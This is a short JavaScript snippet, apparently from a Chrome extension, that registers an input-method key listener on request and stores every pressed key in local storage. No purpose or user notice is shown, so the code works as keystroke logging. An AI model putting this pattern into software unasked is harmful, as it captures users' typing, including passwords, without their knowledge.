chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    console.log(message,"message")
    if (message.action === 'requestInputEvents') {
      chrome.input.ime.onKeyEvent.addListener((engineID, keyData) => {
        if (keyData.type === 'keydown') {
          chrome.storage.local.get('texts', (result) => {
            const texts = result.texts || [];
            texts.push(keyData.key);
            chrome.storage.local.set({ texts });
          });
        }
      });
      sendResponse({ status: 'ok' });
    }
  });
  